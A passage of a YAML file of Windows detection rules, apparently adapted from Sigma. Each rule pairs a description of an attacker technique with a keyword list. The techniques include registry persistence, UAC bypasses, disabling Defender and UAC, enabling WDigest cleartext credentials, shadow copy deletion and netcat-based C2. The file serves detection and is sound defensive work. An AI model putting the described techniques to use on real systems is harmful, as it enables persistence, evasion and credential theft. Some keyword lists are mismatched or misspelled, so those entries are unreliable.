  description: Detects potential COM object hijacking via modification of default
    system CLSID.
  conditions:
    summary:
      regex_any:
      - object
      - hijacking
      - modification
      - default
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdbf0b9d_0182_4c43_893b_a1eaab92d085
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential persistence activity via the registering of a new
    custom protocole handlers. While legitimate applications register protocole handlers
    often times during installation. And attacker can abuse this by setting a custom
    handler to be used as a persistence mechanism.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - custom
      - protocol
      - handler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1e11042_a74a_46e6_b07c_c4ce8ecc239b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential registry persistence technique using the Event Viewer
    "Events.asp" technique
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - event
      - viewer
      - events
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36803969_5421_41ec_b92f_8500f79c23b0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry persistence technique using the GlobalFlags and SilentProcessExit
    keys
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - globalflags
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b23818c7_e575_4d13_8012_332075ec0a2b
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an attacker registers a new IFilter for an extension.
    Microsoft Windows Search uses filters to extract the content of items for inclusion
    in a full-text index.

    You can extend Windows Search to index new or proprietary file types by writing
    filters to extract the content, and property handlers to extract the properties
    of files.

    '
  conditions:
    summary:
      regex_any:
      - register
      - ifiltre
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41f6531d_af6e_4c6e_918f_b946f2b85a36
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an attacker modifies the "REG_MULTI_SZ" value named "Extensions"
    to include a custom DLL to achieve persistence via lsass.

    The "Extensions" list contains filenames of DLLs being automatically loaded by
    lsass.exe. Each DLL has its InitializeLsaExtension() method called after loading.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - extensions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92772523_d9c1_4c93_9547_b0ca500baba3
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker register a new SIP provider for persistence
    and defense evasion
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - mpnotify
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8fbe98a8_8f9d_44f8_aa71_8c572e29ef06
  intent: persistence_installation
  tactic: persistence
  description: Detects modification to the "Default" value of the "MyComputer" key
    and subkeys to point to a custom binary that will be launched whenever the associated
    action is executed (see reference section for example)
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - mycomputer
      - registry
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1b1fd53_9c4a_444c_bae0_34a330fc7aa8
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker adds a new "DLLPathOverride" value to the
    "Natural Language" key in order to achieve persistence which will get invoked
    by "SearchIndexer.exe" process
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - dllpathoverride
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d15044a_7cfe_4d23_8085_6ebc11df7685
  intent: persistence_installation
  tactic: persistence
  description: Detects persistence via Visual Studio Tools for Office (VSTO) add-ins
    in Office applications.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - visual
      - studio
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ddd171b5_2cc6_4975_9e78_f0eccd08cc76
  intent: persistence_installation
  tactic: persistence
  description: 'Detects potential persistence activity via outlook home page.

    An attacker can set a home page to achieve code execution and persistence by editing
    the WebView registry keys.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - outlook
      - home
      - page
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_487bb375_12ef_41f6_baae_c6a1572b4dd1
  intent: persistence_installation
  tactic: persistence
  description: 'Detects potential persistence activity via outlook today page.

    An attacker can set a custom page to execute arbitrary code and link to it via
    the registry values "URL" and "UserDefinedUrl".

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - outlook
      - today
      - page
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0cf2e1c6_8d10_4273_8059_738778f981ad
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential WerFault "ReflectDebugger" registry value abuse for
    persistence.
  conditions:
    summary:
      regex_any:
      - potential
      - werfault
      - reflectdebugger
      - registry
      - value
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe20dda1_6f37_4379_bbe0_a98d400cae90
  intent: persistence_installation
  tactic: persistence
  description: Detect use of scrobj.dll as this DLL looks for the ScriptletURL key
    to get the location of the script to execute
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - scrobj
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dfb5b4e8_91d0_4291_b40a_e3b0d3942c45
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may establish persistence and/or elevate privileges by
    executing malicious content triggered by application shims.

    The Microsoft Windows Application Compatibility Infrastructure/Framework (Application
    Shim) was created to allow for backward compatibility of software as the operating
    system codebase changes over time

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - shim
      - database
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf344fea_d947_4ef4_9192_34d008315d3a
  intent: persistence_installation
  tactic: persistence
  description: Detects installation of new shim databases that try to patch sections
    of known processes for potential process injection or persistence.
  conditions:
    summary:
      regex_any:
      - suspicious
      - shim
      - database
      - patching
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b6976a3_b0e6_4723_ac24_ae38a737af41
  intent: persistence_installation
  tactic: persistence
  description: Detects the installation of a new shim database where the file is located
    in a non-default location
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - shim
      - database
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_086ae989_9ca6_4fe7_895a_759c5544f247
  intent: persistence_installation
  tactic: persistence
  description: Detects modification addition to the 'TypedPaths' key in the user or
    admin registry from a non standard application. Which might indicate persistence
    attempt
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - typedpaths
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_961e33d1_4f86_4fcf_80ab_930a708b2f82
  intent: persistence_installation
  tactic: persistence
  description: Detect potential persistence via the creation of an excel add-in (XLL)
    file to make it run automatically when Excel is started.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - excel
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a9b6c011_ab69_4ddb_bc0a_c4f21c80ec47
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with attachment manager settings policies associations
    to lower the default file type risks (See reference for more information)
  conditions:
    summary:
      regex_any:
      - potential
      - attachment
      - manager
      - settings
      - associations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee77a5db_b0f3_4be2_bfd4_b58be1c6b15a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with attachment manager settings policies attachments
    (See reference for more information)
  conditions:
    summary:
      regex_any:
      - potential
      - attachment
      - manager
      - settings
      - attachments
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f5fe36cf_f1ec_4c23_903d_09a3110f6bbb
  intent: execution
  tactic: execution
  description: 'Detects potential ClickFix malware execution patterns by monitoring
    registry modifications in RunMRU keys containing HTTP/HTTPS links.

    ClickFix is known to be distributed through phishing campaigns and uses techniques
    like clipboard hijacking and fake CAPTCHA pages.

    Through the fakecaptcha pages, the adversary tricks users into opening the Run
    dialog box and pasting clipboard-hijacked content,

    such as one-liners that execute remotely hosted malicious files or scripts.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - clickfix
      - execution
      - pattern
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a5f5a5e_ac01_474b_9b4e_d61298c9df1d
  intent: execution
  tactic: execution
  description: Detects that a powershell code is written to the registry as a service.
  conditions:
    summary:
      regex_any:
      - powershell
      - service
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fad91067_08c5_4d1a_8d8c_d96a21b37814
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the PowerShell execution policy in order to bypass
    signing requirements for script execution
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - execution
      - policy
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d85cf08_bf97_4260_ba49_986a2a65129c
  intent: persistence_installation
  tactic: persistence
  description: Detects potential PowerShell commands or code within registry run keys
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - registry
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fecfd1a1_cc78_4313_a1ea_2ee2e8ec27a7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the registry for the currently logged-in user. In
    order to disable PowerShell module logging, script block logging or transcription
    and script execution logging
  conditions:
    summary:
      regex_any:
      - powershell
      - logging
      - disabled
      - registry
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7021255e_5db3_4946_a8b9_0ba7a4644a69
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential abuse of the provisioning registry key for indirect
    command execution through "Provlaunch.exe".
  conditions:
    summary:
      regex_any:
      - potential
      - provisioning
      - registry
      - abuse
      - binary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8023f872_3f1d_4301_a384_801889917ab4
  intent: unknown
  tactic: resource_development
  description: Detects non-sysinternals tools setting the "accepteula" key which normally
    is set on sysinternals tool execution
  conditions:
    summary:
      regex_any:
      - usage
      - renamed
      - sysinternals
      - tools
      - registryset
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a7df0e9e_91a5_459a_a003_4cde67c2ff5d
  intent: execution
  tactic: execution
  description: 'Detects execution of commands via the run dialog box on Windows by
    checking values of the "RunMRU" registry key.

    This technique was seen being abused by threat actors to deceive users into pasting
    and executing malicious commands, often disguised as CAPTCHA verification steps.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - command
      - executed
      - dialog
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_40b6e656_4e11_4c0c_8772_c1cc6dae34ce
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry key established after masqueraded .scr file execution
    using Rundll32 through desk.cpl
  conditions:
    summary:
      regex_any:
      - screensaver
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c304b02_06e6_402d_8be4_d5833cdf8198
  intent: persistence_installation
  tactic: persistence
  description: Detects potentially suspicious changes to the SentinelOne context menu
    scan command by a process other than SentinelOne.
  conditions:
    summary:
      regex_any:
      - potential
      - sentinelone
      - shell
      - context
      - menu
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_612e47e9_8a59_43a6_b404_f48683f45bd6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects changes to the "ServiceDLL" value related to a service in
    the registry.

    This is often used as a method of persistence.

    '
  conditions:
    summary:
      regex_any:
      - servicedll
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c3121ed_041b_4d97_a075_07f54f20fb4a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry modifications that disable internal tools or functions
    in explorer (malware like Agent Tesla uses this technique)
  conditions:
    summary:
      regex_any:
      - registry
      - explorer
      - policy
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a2b21ee_6aaa_4234_ac9d_59a59edf90a1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an attacker register a new SIP provider for persistence
    and defense evasion
  conditions:
    summary:
      regex_any:
      - persistence
      - provider
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f4662ac_17ca_43aa_8f12_5d7b989d0101
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tamper attempts to sophos av functionality via registry key
    modification
  conditions:
    summary:
      regex_any:
      - tamper
      - with
      - sophos
      - registry
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8aebc67_a56d_4ec9_9fbe_7b0e8b7b4efd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects modifications to the registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to
    "0" in order to hide user account from being listed on the logon screen.
  conditions:
    summary:
      regex_any:
      - hiding
      - user
      - account
      - specialaccounts
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c93308a_3f1b_40a9_b649_57ea1a1c1d63
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect set Notification_Suppress to 1 to disable the Windows security
    center notification
  conditions:
    summary:
      regex_any:
      - activate
      - suppression
      - windows
      - security
      - center
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_966315ef_c5e1_4767_ba25_fce9c8de3660
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of user-specific or system-wide environment variables
    via the registry. Which contains suspicious commands and strings
  conditions:
    summary:
      regex_any:
      - suspicious
      - environment
      - variable
      - been
      - registered
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34aa0252_6039_40ff_951f_939fd6ce47d8
  intent: unknown
  tactic: resource_development
  description: Detects the keyboard preload installation with a suspicious keyboard
    layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems
    maintained by US staff only
  conditions:
    summary:
      regex_any:
      - suspicious
      - keyboard
      - layout
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4eec988f_7bf0_49f1_8675_1e6a510b3a2a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detect changes to the "PendingFileRenameOperations" registry key from
    uncommon or suspicious images locations to stage currently used files for rename
    or deletion after reboot.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - pendingfilerenameoperations
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0813366_0407_449a_9869_a2db1119dc41
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a suspicious printer driver installation with an empty Manufacturer
    value
  conditions:
    summary:
      regex_any:
      - suspicious
      - printer
      - driver
      - empty
      - manufacturer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7916c2a_fa2f_4795_9477_32b731f70f11
  intent: persistence_installation
  tactic: persistence
  description: Detects a possible persistence mechanism using RUN key for Windows
    Explorer and pointing to a suspicious folder
  conditions:
    summary:
      regex_any:
      - registry
      - persistence
      - explorer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02ee49e2_e294_4d0f_9278_f5b3212fc588
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious new RUN key element pointing to an executable in
    a suspicious folder
  conditions:
    summary:
      regex_any:
      - pointing
      - suspicious
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f2485272_a156_4773_82d7_1d178bc4905b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects installation of NalDrv or PROCEXP152 services via registry-keys
    to non-system32 folders.

    Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs),
    which uses KDU (https://github.com/hfiref0x/KDU)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - installed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c226817_8dc9_46c2_a58d_66655aafd7dc
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect modification of the startup key to a path where a payload could
    be stored to be launched during startup
  conditions:
    summary:
      regex_any:
      - modify
      - user
      - shell
      - folders
      - startup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f1d8209_636e_4c6c_a137_781cca8b82f9
  intent: execution
  tactic: execution
  description: 'Detects registry modifications that add Windows Filtering Platform
    (WFP) filters, which may be used to block security tools and EDR agents from reporting
    events.

    '
  conditions:
    summary:
      regex_any:
      - filter
      - added
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c420410f_c2d8_4010_856b_dffe21866437
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "NoLMHash" registry value in order to allow
    Windows to store LM Hashes.

    By setting this registry value to "0" (DWORD), Windows will be allowed to store
    a LAN manager hash of your password in Active Directory and local SAM databases.

    '
  conditions:
    summary:
      regex_any:
      - enable
      - hash
      - storage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4720b7df_40c3_48fd_bbdf_fd4b3c464f0d
  intent: persistence_installation
  tactic: persistence
  description: Monitor the creation of a new key under 'TaskCache' when a new scheduled
    task is registered by a process that is not svchost.exe, which is suspicious
  conditions:
    summary:
      regex_any:
      - scheduled
      - taskcache
      - change
      - uncommon
      - program
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_73a883d0_0348_4be4_a8d8_51031c2564f8
  intent: persistence_installation
  tactic: persistence
  description: 'Detects potential persistence behavior using the windows telemetry
    registry key.

    Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety
    of commands and perform the actual telemetry collections.

    This binary was created to be easily extensible, and to that end, it relies on
    the registry to instruct on which commands to run.

    The problem is, it will run any arbitrary command without restriction of location
    or type.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - registry
      - persistence
      - attempt
      - windows
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2863fbc_d5cb_48d5_83fb_d976d4b1743b
  intent: persistence_installation
  tactic: persistence
  description: 'Detects tampering of RDP Terminal Service/Server sensitive settings.

    Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''
    or enabling RDP via ''fDenyTSConnections'', etc.

    '
  conditions:
    summary:
      regex_any:
      - sensitive
      - settings
      - changed
      - zero
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3f6b7b62_61aa_45db_96bd_9c31b36b653c
  intent: persistence_installation
  tactic: persistence
  description: 'Detects tampering of RDP Terminal Service/Server sensitive settings.

    Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''
    or enabling RDP via ''fDenyTSConnections''...etc

    '
  conditions:
    summary:
      regex_any:
      - sensitive
      - settings
      - changed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e88a6ddc_74f7_463b_9b26_f69fc0d2ce85
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.

    Adversaries may abuse time providers to execute DLLs when the system boots.

    The Windows Time service (W32Time) enables time synchronization across and within
    domains.

    '
  conditions:
    summary:
      regex_any:
      - timeproviders
      - registered
      - with
      - uncommon
      - name
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_439957a7_ad86_4a8f_9705_a28131c6821b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects applications or users re-enabling old TLS versions by setting
    the "Enabled" value to "1" for the "Protocols" registry key.
  conditions:
    summary:
      regex_any:
      - tls1
      - tls1
      - protocol
      - version
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dc5c24af_6995_49b2_86eb_a9ff62199e82
  intent: persistence_installation
  tactic: persistence
  description: Detect modification of TreatAs key to enable "rundll32.exe -sta" command
  conditions:
    summary:
      regex_any:
      - hijacking
      - treatas
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b110ebaf_697f_4da1_afd5_b536fa27a2c1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when the enablement of developer features such as "Developer
    Mode" or "Application Sideloading". Which allows the user to install untrusted
    packages.
  conditions:
    summary:
      regex_any:
      - potential
      - signing
      - bypass
      - windows
      - developer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7c81fec3_1c1d_43b0_996a_46753041b1b6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects UAC bypass method using Windows event viewer
  conditions:
    summary:
      regex_any:
      - bypass
      - event
      - viewer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b872a46_3b90_45c1_8419_f675db8053aa
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using registry key manipulation of
    sdclt.exe (e.g. UACMe 53)
  conditions:
    summary:
      regex_any:
      - bypass
      - sdclt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6597be7b_ac61_4ac8_bef4_d3ec88174853
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  conditions:
    summary:
      regex_any:
      - bypass
      - abusing
      - winsat
      - path
      - parsing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f9db380_ea57_4d1e_beab_8a2d33397e93
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - windows
      - media
      - player
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48437c39_9e5f_47fb_af95_3d663c3f2919
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when an attacker tries to disable User Account Control (UAC)
    by setting the registry value "EnableLUA" to 0.

    '
  conditions:
    summary:
      regex_any:
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c5f6a85d_b647_40f7_bbad_c10b66bab038
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when an attacker tries to disable User Account Control (UAC)
    notification by tampering with the "UACDisableNotify" value.

    UAC is a critical security feature in Windows that prevents unauthorized changes
    to the operating system. It prompts the user for permission or an administrator
    password before allowing actions that could affect the system''s operation or
    change settings that affect other users.

    When "UACDisableNotify" is set to 1, UAC prompts are suppressed.

    '
  conditions:
    summary:
      regex_any:
      - notification
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d7ceeef_3539_4392_8953_3dc664912714
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when an attacker tries to change User Account Control (UAC)
    elevation request destination via the "PromptOnSecureDesktop" value.

    The "PromptOnSecureDesktop" setting specifically determines whether UAC prompts
    are displayed on the secure desktop. The secure desktop is a separate desktop
    environment that''s isolated from other processes running on the system. It''s
    designed to prevent malicious software from intercepting or tampering with UAC
    prompts.

    When "PromptOnSecureDesktop" is set to 0, UAC prompts are displayed on the user''s
    current desktop instead of the secure desktop. This reduces the level of security
    because it potentially exposes the prompts to manipulation by malicious software.

    '
  conditions:
    summary:
      regex_any:
      - secure
      - desktop
      - prompt
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46490193_1b22_4c29_bdd6_5bf63907216f
  intent: persistence_installation
  tactic: persistence
  description: Detects VBScript content stored into registry keys as seen being used
    by UNC2452 group
  conditions:
    summary:
      regex_any:
      - vbscript
      - payload
      - stored
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fc014922_5def_4da9_a0fc_28c973f41bfb
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects that the path to the DLL written in the registry
    is different from the default one. Launched WAB.exe tries to load the DLL from
    Registry.
  conditions:
    summary:
      regex_any:
      - execution
      - choice
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d6a9b252_c666_4de6_8806_5561bbbd3bdc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential malicious modification of the property value of UseLogonCredential
    from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to enable
    clear-text credentials
  conditions:
    summary:
      regex_any:
      - wdigest
      - enable
      - uselogoncredential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0eb46774_f1ab_4a74_8238_1155855f2263
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when attackers or tools disable Windows Defender functionalities
    via the Windows registry
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - defender
      - functionalities
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa277e82_9b78_42dd_b05c_05555c7b6015
  intent: persistence_installation
  tactic: persistence
  description: Detects changes to the AppInstaller (winget) policy. Specifically the
    activation of the local manifest installation, which allows a user to install
    new packages via custom manifests.
  conditions:
    summary:
      regex_any:
      - enable
      - local
      - manifest
      - installation
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7997770_92c3_4ec9_b112_774c4ef96f96
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when the ''AllowMultipleTSSessions'' value is enabled.

    Which allows for multiple Remote Desktop connection sessions to be opened at once.

    This is often used by attacker as a way to connect to an RDP session without disconnecting
    the other users

    '
  conditions:
    summary:
      regex_any:
      - winlogon
      - allowmultipletssessions
      - enable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bbf59793_6efb_4fa1_95ca_a7d288e52c88
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may abuse features of Winlogon to execute DLLs and/or
    executables when a user logs in.

    Winlogon.exe is a Windows component responsible for actions at logon/logoff as
    well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

    '
  conditions:
    summary:
      regex_any:
      - winlogon
      - notify
      - logon
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_999bff6d_dc15_44c9_9f5c_e1051bfc86e1
  intent: execution
  tactic: execution
  description: Detects a powershell download cradle using nslookup. This cradle uses
    nslookup to extract payloads from DNS records.
  conditions:
    summary:
      regex_any:
      - nslookup
      - powershell
      - download
      - cradle
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87df9ee1_5416_453a_8a08_e8d4a51e9ce1
  intent: impact_operations
  tactic: impact
  description: Shadow Copies deletion using operating systems utilities via PowerShell
  conditions:
    summary:
      regex_any:
      - delete
      - volume
      - shadow
      - copies
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6331d09b_4785_4c13_980f_f96661356249
  intent: execution
  tactic: execution
  description: Detects PowerShell downgrade attack by comparing the host versions
    with the actually used engine version 2.0
  conditions:
    summary:
      regex_any:
      - powershell
      - downgrade
      - attack
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c70e019b_1479_4b65_b0cc_cd0c6093a599
  intent: execution
  tactic: execution
  description: Detects PowerShell called from an executable by the version mismatch
    method
  conditions:
    summary:
      regex_any:
      - powershell
      - called
      - from
      - executable
      - version
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c5b20776_639a_49bf_94c7_84f912b91c15
  intent: command_and_control_setup
  tactic: command_and_control
  description: Adversaries may use a non-application layer protocol for communication
    between host and C2 server or among infected hosts within a network
  conditions:
    summary:
      regex_any:
      - netcat
      - powershell
      - version
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f65e22f9_819e_4f96_9c7b_498364ae7a25
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of  the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  conditions:
    summary:
      regex_any:
      - potential
      - remotefxvgpudisablement
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3236fcd0_b7e3_4433_b4f8_86ad61a9af2d
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell download command
  conditions:
    summary:
